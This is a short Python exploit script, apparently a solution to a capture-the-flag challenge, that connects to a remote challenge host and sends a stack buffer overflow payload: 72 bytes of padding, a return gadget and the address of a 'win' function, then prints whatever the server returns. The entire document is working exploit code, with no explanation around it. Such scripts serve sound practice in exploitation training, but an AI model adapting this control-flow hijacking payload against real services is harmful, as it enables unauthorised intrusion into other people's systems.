import socket, struct

HOST = "gzcli.techcomfest.1pc.tf"
PORT = 44735

RET = 0x400506
WIN = 0x40068a
OFFSET = 72

payload = b"A" * OFFSET + struct.pack("<Q", RET) + struct.pack("<Q", WIN) + b"\n"

s = socket.create_connection((HOST, PORT))
# read prompt (best-effort)
try:
    s.settimeout(1.0)
    print(s.recv(4096).decode(errors="ignore"), end="")
except Exception:
    pass

s.sendall(payload)

# read everything until server closes
out = b""
s.settimeout(2.0)
while True:
    try:
        chunk = s.recv(4096)
        if not chunk:
            break
        out += chunk
    except Exception:
        break

print(out.decode(errors="ignore"))
s.close()
